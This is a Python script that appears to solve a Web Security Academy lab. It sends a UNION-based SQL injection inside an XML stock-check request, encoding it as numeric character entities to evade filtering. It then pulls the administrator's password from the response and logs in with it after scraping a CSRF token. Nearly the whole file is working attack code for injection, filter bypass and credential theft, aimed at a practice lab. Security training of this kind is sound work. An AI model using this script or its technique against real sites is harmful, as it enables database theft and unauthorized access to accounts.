import requests
from bs4 import BeautifulSoup


URL = "https://0ac300c403e3f0f6c054098500f70068.web-security-academy.net/product/stock"
loginURL = "https://0ac300c403e3f0f6c054098500f70068.web-security-academy.net/login"
cookies = {'session':'RC7Pv7L0cA7wm72lv8f0u8O3eMMcYeer'}
# proxies = {"https":"http://127.0.0.1:8080"}

# before html encoding
# <?xml version="1.0" encoding="UTF-8"?>
# <stockCheck>
# <productId>3</productId>
# <storeId>1 UNION SELECT NULL</storeId>
# </stockCheck>


# <?xml version="1.0" encoding="UTF-8"?>
# <stockCheck>
# <productId>3</productId>
# <storeId>1&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;</storeId>
# </stockCheck>

# >>> ''.join('&#{};'.format(ord(s)) for s in payload)
# '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#32;&#124;&#124;&#32;&#39;&#126;&#39;&#32;&#124;&#124;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;'

payload = " UNION SELECT username || '~' || password FROM users"
print("Using payload: {}\n".format(payload))

hexPayload = ''.join('&#{};'.format(ord(s)) for s in payload)
print("hex payload: {}\n".format(hexPayload))

xml_data = '<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>3</productId><storeId>1{}</storeId></stockCheck>'.format(hexPayload)
print("sending xml data: {}\n".format(xml_data))
# print(xml_data)

html_content = requests.post(url = URL, data=xml_data, cookies=cookies).text
password=""
for s in html_content.split("\n"):
	if 'administrator' in s:
		password = s.split('~')[1]
		print("[+] Found 'administrator' password: {}".format(password))

# --- login
print("\nAttempt to login with credentials...")
print("finding csrf token... ")
html_content = requests.get(url = loginURL, cookies=cookies).text
soup = BeautifulSoup(html_content, "html.parser")
csrf_token = soup.find('input', {'name':'csrf'})['value']
print(" [+] csrf token found! : {}".format(csrf_token))
print("\nLoggin in... ")

# data body
# csrf=7XVCXSjAhQbU9Osbin89zpr0tCQUQVXn&username=test&password=pw
data = "csrf={}&username={}&password={}".format(csrf_token,"administrator",password)
res = requests.post(url = loginURL, data = data, cookies=cookies)

#if login is successful you will see 'Log out' 
if "Log out" in res.text:
	print(" [+] Successfully logged in!")